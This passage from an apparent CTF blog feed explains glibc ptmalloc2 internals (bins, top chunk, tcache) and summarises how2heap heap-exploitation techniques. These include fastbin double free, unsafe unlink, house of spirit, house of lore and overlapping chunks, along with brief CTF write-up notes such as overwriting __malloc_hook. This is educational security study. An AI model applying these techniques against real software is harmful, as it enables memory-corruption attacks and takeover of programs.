\</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">45</span>)                                     \</span><br><span class="line">         ? <span class="number">49</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                                  \</span></span><br><span class="line">    (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>)                                     \</span><br><span class="line">         ? <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>)                                  \</span><br><span class="line">         : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)                               \</span><br><span class="line">               ? <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>)                            \</span><br><span class="line">               : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)                        \</span><br><span class="line">                     ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>)                    \</span><br><span class="line">                     : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)                   \</span><br><span class="line">                           ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>)              \</span><br><span class="line">                           : ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)             \</span><br><span class="line">                                 ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>)        \</span><br><span class="line">                                 : <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index(sz)                                                     \</span></span><br><span class="line">    (SIZE_SZ == <span class="number">8</span> ? largebin_index_64(sz) : MALLOC_ALIGNMENT == <span class="number">16</span>             \</span><br><span class="line">                                                ? largebin_index_32_big(sz)    \</span><br><span class="line">                                                : largebin_index_32(sz))</span><br></pre></td></tr></table></figure><h4 id="Top-bin"><a href="#Top-bin" class="headerlink" title="Top bin"></a>Top bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Top</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The top-most available chunk (i.e., the one bordering the end of</span></span><br><span class="line"><span class="comment">    available memory) is treated specially. It is never included in</span></span><br><span class="line"><span class="comment">    any bin, is used only if no other chunk is available, and is</span></span><br><span class="line"><span class="comment">    released back to the system if it is very large (see</span></span><br><span class="line"><span class="comment">    M_TRIM_THRESHOLD).  Because top initially</span></span><br><span class="line"><span class="comment">    points to its own bin with initial zero size, thus forcing</span></span><br><span class="line"><span class="comment">    extension on the first malloc request, we avoid having any special</span></span><br><span class="line"><span class="comment">    code in malloc to check whether it even exists yet. But we still</span></span><br><span class="line"><span class="comment">    need to do so when getting memory from system, so we make</span></span><br><span class="line"><span class="comment">    initial_top treat the bin as a legal but unusable chunk during the</span></span><br><span class="line"><span class="comment">    interval between initialization and the first call to</span></span><br><span class="line"><span class="comment">    sysmalloc. (This is somewhat delicate, since it relies on</span></span><br><span class="line"><span class="comment">    the 2 preceding words to be zero during this interval as well.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> initial_top(M) (unsorted_chunks(M))</span></span><br></pre></td></tr></table></figure><p>一个 arena 中最顶部的 chunk 被称为「<strong>top chunk</strong>」。它不属于任何 bin 。当所有 bin 中都没有合适空闲内存时，就会使用 top chunk 来响应用户请求。</p><p>当 top chunk 的大小比用户请求的大小大的时候，top chunk 会分割为两个部分：</p><ul><li>User chunk，返回给用户；</li><li>Remainder chunk，剩余部分，将成为新的 top chunk。</li></ul><p>当 top chunk 的大小比用户请求的大小小的时候，top chunk 就通过 <code>sbrk</code>（main arena）或 <code>mmap</code>（ thread arena）系统调用扩容。</p><p>需要注意的是，top chunk 的 prev_inuse 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p><h4 id="Last-remainder-chunk"><a href="#Last-remainder-chunk" class="headerlink" title="Last remainder chunk"></a>Last remainder chunk</h4><p>「<strong>last remainder chunk</strong>」即最后一次 small request 中因分割而得到的剩余部分，它有利于改进引用局部性，也即后续对 small chunk 的 <code>malloc</code> 请求可能最终被分配得彼此靠近。</p><p>那么 arena 中的若干 chunks，哪个有资格成为 last remainder chunk 呢？</p><p>当用户请求 small chunk 而无法从 small bin 和 unsorted bin 得到服务时，分配器就会通过扫描 binmaps 找到最小非空 bin。正如前文所提及的，如果这样的 bin 找到了，其中最合适的 chunk 就会分割为两部分：返回给用户的 User chunk 、添加到 unsorted bin 中的 Remainder chunk。这一 Remainder chunk 就将成为 last remainder chunk。</p><p>那么引用局部性是如何达成的呢？</p><p>当用户的后续请求 small chunk，并且 last remainder chunk 是 unsorted bin 中唯一的 chunk，该 last remainder chunk 就将分割成两部分：返回给用户的 User chunk、添加到 unsorted bin 中的 Remainder chunk（<strong>也是 last remainder chunk</strong>）。因此后续的请求的 chunk 最终将被分配得彼此靠近。</p><h3 id="TCache"><a href="#TCache" class="headerlink" title="TCache"></a>TCache</h3><p>tcache(per-thread cache)在<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc">glibc2.26</a>中引入，进一步提升堆管理性能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>tcache_entry用于链接空闲的chunk，指针直接<strong>指向chunk的userdata</strong>部分，也就是说复用了指针的含义。</p><p>每个arena都会维护一个tcache_prethread_struct，它是整个tcache机制的管理结构，其中包含TCACHE_MAX_BINS个tcache_entry链表。链入其中的chunk大小相同，所以通常也叫做<code>tcache bin</code>。其特性如下：</p><ul><li>每个tcache bin最多只能有7个(<code>TCACHE_FILL_COUNT </code>)chunk</li><li>tcache bin中chunk的inuse位不会置零，也就是说不会进行合并</li><li>LIFO</li></ul><p>可以看到其特性和fastbin是非常类似的。释放时在填满tcache之后才进入传统的释放过程，分配时也先从tcache中搜索。</p><p>tcache bin一共有64个(<code>TCACHE_MAX_BINS</code>)，其大小范围为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* With rounding and alignment, the bins are...</span><br><span class="line">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="line">   idx 1   bytes 25..40 or 13..20</span><br><span class="line">   idx 2   bytes 41..56 or 21..28</span><br><span class="line">   etc.  *&#x2F;</span><br></pre></td></tr></table></figure><p>由于tcache的增加和删除非常简洁，因此速度很快，但另一方面这也意味着缺乏各种安全检查和mitigation，在利用时候也格外方便。</p><p><a href="https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d">commit</a>添加了double free检测。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。&lt;/p&gt;
&lt;p&gt;需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，&lt;strong&gt;只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&quot;基本操作&quot;&gt;&lt;a href=&quot;#基本操作&quot; class=&quot;headerlink&quot; title=&quot;基本操作&quot;&gt;&lt;/a&gt;基本操作&lt;/h2&gt;&lt;h3 id=&quot;malloc&quot;&gt;&lt;a href=&quot;#malloc&quot; class=&quot;headerlink&quot; title=&quot;malloc&quot;&gt;&lt;/a&gt;malloc&lt;/h3&gt;&lt;p&gt;&lt;code&gt;malloc(size_t n)&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当 n=0 时，返回当前系统允许的堆的最小内存块。&lt;/li&gt;
&lt;li&gt;当 n 为负数时，由于在大多数系统上，&lt;strong&gt;size_t 是无符号数（这一点非常重要）&lt;/strong&gt;，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;free&quot;&gt;&lt;a href=&quot;#free&quot; class=&quot;headerlink&quot; title=&quot;free&quot;&gt;&lt;/a&gt;free&lt;/h3&gt;&lt;p&gt;&lt;code&gt;free(void *p)&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;当 p 为空指针时，函数不执行任何操作。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 &lt;code&gt;double free&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;背后的系统调用&quot;&gt;&lt;a href=&quot;#背后的系统调用&quot; class=&quot;headerlink&quot; title=&quot;背后的系统调用&quot;&gt;&lt;/a&gt;背后的系统调用&lt;/h2&gt;&lt;p&gt;这些函数背后的系统调用主要是 &lt;a href=&quot;http://man7.org/linux/man-pages/man2/sbrk.2.html&quot;&gt;(s)brk&lt;/a&gt; 函数以及 &lt;a href=&quot;http://man7.org/linux/man-pages/man2/mmap.2.html&quot;&gt;mmap, munmap&lt;/a&gt; 函数。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>How2heap总结</title>
    <link href="http://hhdx.xyz/2020/08/01/How2heap%E6%80%BB%E7%BB%93/"/>
    <id>http://hhdx.xyz/2020/08/01/How2heap%E6%80%BB%E7%BB%93/</id>
    <published>2020-08-01T11:36:10.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="first-fit"><a href="#first-fit" class="headerlink" title="first-fit"></a>first-fit</h2><p>如果一个chunk可用且足够大，那么就会使用这个chunk。</p><h2 id="calc-tcache-idx"><a href="#calc-tcache-idx" class="headerlink" title="calc_tcache_idx"></a>calc_tcache_idx</h2><p>tcache(thread local caching)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br></pre></td></tr></table></figure><p>tcache拥有和fastbin差不多的结构。默认情况下，64个bin，每个bin最多7个chunk</p><p>64bit: <code>IDX = (CHUNKSIZE - 0x11) / 0x10</code></p><a id="more"></a><h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>free(fastbin)过程中，只检查了链表头部是否和将要free的指针一样。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>此时fastbin 0x20: <code>a-&gt;b-&gt;a</code></p><p><strong>附注：</strong></p><p>tcache可以检测到double free。在本机glibc2.31中发现，tcache_entry中使用key指向了tcache_perthread_struct。<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=f7cd29bc2f93e1082ee77800bd64a4b2a2897055;hb=9ea3686266dca3f004ba874745a4087a89682617#l4186">malloc.c:4186</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>tcache检测double free代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fastbin-dup-into-stack-c"><a href="#fastbin-dup-into-stack-c" class="headerlink" title="fastbin_dup_into_stack.c"></a>fastbin_dup_into_stack.c</h2><p>假设fastbin中通过double free得到以下序列。</p><p>fastbin: <code>a-&gt;b-&gt;a</code></p><p>第一次malloc得到a后，修改数据，使得第二个a-&gt;fd指向栈地址。</p><h3 id="0ctf2017-babyheap"><a href="#0ctf2017-babyheap" class="headerlink" title="0ctf2017-babyheap"></a>0ctf2017-babyheap</h3><p>fill函数中存在对chunk的任意长度溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x20</span>)</span><br><span class="line">allocate(<span class="number">0x20</span>)</span><br><span class="line">allocate(<span class="number">0x20</span>)</span><br><span class="line">allocate(<span class="number">0x20</span>)</span><br><span class="line">allocate(<span class="number">0x80</span>)<span class="comment"># smallbin</span></span><br></pre></td></tr></table></figure><p>mmap分配空间那块没看懂，怎么就获得了随机空间。。如果有人看懂，麻烦告诉我一下</p><p><strong>泄露</strong>：通过<strong>partial overwrite</strong>修改fd，指向smallbin。溢出修改smallbin-&gt;size为0x31，两次分配后得到另一指针指向该smallbin。而后重新修改smallbin-&gt;size为0x91，free该smallbin，smallbin-&gt;fd和smallbin-&gt;bk就会指向main_arena中的区域。使用另一指针打印内容就可以得到libc_base。</p><p><strong>攻击</strong>：0x70 fastbin attack，复写<code>__malloc_hook</code>为one_gadget地址。</p><h3 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h3><p><a href="https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></p><h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>double free fastbin到unsorted bin和fastbin。通过分配large bin触发malloc_consolidate，清空fastbin到unsorted bin。<a href="https://raw.githubusercontent.com/cloudburst/libheap/master/heap.png">图源</a></p><p><img src="https://raw.githubusercontent.com/cloudburst/libheap/master/heap.png"></p><h3 id="Hitcon-2016-SleepyHolder"><a href="#Hitcon-2016-SleepyHolder" class="headerlink" title="Hitcon 2016 SleepyHolder"></a>Hitcon 2016 SleepyHolder</h3><p>fastbin dup consolidate double free</p><p>unsafe unlink</p><h3 id="ref-1"><a href="#ref-1" class="headerlink" title="ref"></a>ref</h3><p><a href="https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder">https://github.com/mehQQ/public_writeup/tree/master/hitcon2016/SleepyHolder</a></p><h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h2><p>在前块中构造fake_chunk，用一些方法将后块的pre_in_use位清掉，释放后块向前合并。</p><p>伪造fake_chunk需要绕过检查，一般用某个指针变量前后的地址当做fd、bk。之后就会将该指针变量就会被覆盖。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;      \</span><br><span class="line">    BK = P-&gt;bk;      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure><p>how2heap对glibc的版本要求<code>&lt;2.26</code>似乎有误？据我测试，<strong>glibc2.31 without tcache也可以运行成功</strong>，只要添加<code>chunk0_ptr[1] = (uint64_t)malloc_size;</code>，glibc2.31中看起来只是增加了size的验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">    unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>非fastbin size才会进行前后consolidate。</strong></p><h3 id="Hitcon2014-stkof"><a href="#Hitcon2014-stkof" class="headerlink" title="Hitcon2014 stkof"></a>Hitcon2014 stkof</h3><p>p1分配0x80，p2分配0x80。</p><p>p1内伪造fake_chunk，溢出修改p2的pre_size,pre_in_use。free(p2)</p><p>覆盖free_got泄露地址，再任意写到atoi_got</p><h2 id="House-of-spirit"><a href="#House-of-spirit" class="headerlink" title="House of spirit"></a>House of spirit</h2><p>在不可控区域周围构造fakechunk，覆盖某指针，释放再分配，以控制不可控区域。</p><h3 id="hack-lu2014-oreo"><a href="#hack-lu2014-oreo" class="headerlink" title="hack.lu2014 oreo"></a>hack.lu2014 oreo</h3><p>在message_ptr周围构造。</p><h2 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison null byte"></a>poison null byte</h2><p>溢出，覆盖已经释放的chunk的size，使其大小变小。free后块使其合并。</p><h3 id="Plaidctf2015-plaiddb"><a href="#Plaidctf2015-plaiddb" class="headerlink" title="Plaidctf2015 plaiddb"></a>Plaidctf2015 plaiddb</h3><p>null byte溢出，堆块重叠，libc泄露和fastbin attack</p><h3 id="ref-2"><a href="#ref-2" class="headerlink" title="ref"></a>ref</h3><ol><li><a href="https://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html">https://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb</a></li></ol><h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><p><strong>glibc2.31 without tcache可以运行成功。</strong></p><p>smallbin链表的特点是头插尾取的FIFO。</p><p>关键的漏洞点在，攻击者可以控制已经释放的smallbin的bk指针。取出smallbin过程中，双向链表尾部被修改为fake_chunk。</p><p>程序中的描述对于64位有些问题，但没有影响效果。64位过程如下：</p><p><code>free((void*)victim)</code>后，该chunk被放入fastbin，后<code>void *p2 = malloc(1200);</code>申请largebin触发malloc_consolidate，将fastbin放入unsortedbin，然后遍历unsortedbin查找chunk导致victim chunk被放入smallbin。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim_chunk-&gt;bk   = stack_buffer_1;</span><br><span class="line">stack_buffer_1-&gt;fd = vimtim_chunk;</span><br><span class="line">stack_buffer_1-&gt;bk = stack_buffer_2;</span><br><span class="line">stack_buffer_2-&gt;fd = stack_buffer_1;</span><br></pre></td></tr></table></figure><h2 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping chunks"></a>overlapping chunks</h2><p>溢出，对unsortedbin中的chunk的size进行更改，造成重叠。可以添加<code>prev_size(nextchunk) == chunk-&gt;size</code>检查修补。</p><h3 id="hack-lu2015-bookstore"><a href="#hack-lu2015-bookstore" class="headerlink" title="hack.lu2015 bookstore"></a>hack.lu2015 bookstore</h3><p>overlapping</p><p>format string vulnerability：泄露libc，修改fini_array和返回地址</p><h2 id="overlapping-chunks-2"><a href="#overlapping-chunks-2" class="headerlink" title="overlapping chunks 2"></a>overlapping chunks 2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p2 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p3 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p4 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">p5 